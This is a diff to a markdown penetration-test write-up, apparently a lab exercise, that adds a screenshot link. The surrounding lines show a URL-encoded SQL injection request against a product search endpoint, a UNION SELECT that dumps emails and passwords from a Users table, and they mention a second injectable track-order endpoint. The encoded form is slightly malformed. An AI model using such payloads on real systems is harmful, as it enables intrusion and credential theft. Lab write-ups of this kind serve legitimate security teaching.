@@ -140,6 +140,7 @@ In Burp Suite:
 GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%%2C%20%278%27%2C%20%279%27%20FROM%20Users-- HTTP/1.1
 ```
 This is the same as: “q=')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users”
+![Screenshot](Pictures/Pic_1.png)
 #### Track Order API
 The track order functionality (/rest/track-order/`<id>`) was vulnerable to SQL injection. The order ID parameter was inserted directly into a SQL query without validation. By appending SQL control characters to the order number in the URL, the database query could be manipulated.
 
